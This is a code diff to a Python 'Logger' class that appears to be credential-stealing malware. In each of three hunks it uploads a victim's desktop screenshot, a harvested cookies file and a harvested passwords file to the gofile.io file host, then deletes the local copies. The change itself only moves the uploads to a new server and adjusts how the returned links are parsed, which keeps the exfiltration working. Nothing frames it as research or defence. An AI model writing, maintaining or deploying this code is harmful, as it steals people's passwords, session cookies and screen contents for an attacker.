@@ -195,8 +195,8 @@ class Logger():
             screen = open(r'C:\ProgramData\desktop.jpg', 'rb')
             screen.close()
             try:
-                screenshotRaw = requests.post('https://store9.gofile.io/uploadFile', files={'file': ('C:\\ProgramData\\desktop.jpg', open('C:\\ProgramData\\desktop.jpg', 'rb')),}).text
-                screenshotUploaded = f"[Desktop Image]({screenshotRaw[39:65]})"
+                screenshotRaw = requests.post('https://srv-store2.gofile.io/uploadFile', files={'file': ('C:\\ProgramData\\desktop.jpg', open('C:\\ProgramData\\desktop.jpg', 'rb')),}).text
+                screenshotUploaded = f"[Desktop Image]({screenshotRaw[87:113]})"
             except:
                 screenshotUploaded = "Desktop Image: N/A"
                 pass
@@ -205,8 +205,8 @@ class Logger():
             
         # Cookies
         try:
-            cookiesRaw = requests.post('https://store9.gofile.io/uploadFile', files={'file': ('rc.txt', open('rc.txt', 'rb')),}).text
-            cookiesUploaded = f"[Cookies]({cookiesRaw[39:65]})"
+            cookiesRaw = requests.post('https://srv-store2.gofile.io/uploadFile', files={'file': ('rc.txt', open('rc.txt', 'rb')),}).text
+            cookiesUploaded = f"[Cookies]({cookiesRaw[87:113]})"
             os.remove("rc.txt")
         except Exception as e:
             print(e)
@@ -214,8 +214,8 @@ class Logger():
 
         # Passwords
         try:
-            passwordsRaw = requests.post('https://store9.gofile.io/uploadFile', files={'file': ('psd.txt', open('psd.txt', 'rb')),}).text
-            passwordsUploaded = f"[Passwords]({passwordsRaw[39:65]})"
+            passwordsRaw = requests.post('https://srv-store2.gofile.io/uploadFile', files={'file': ('psd.txt', open('psd.txt', 'rb')),}).text
+            passwordsUploaded = f"[Passwords]({passwordsRaw[87:113]})"
             os.remove("psd.txt")
         except Exception as e:
             print(e)
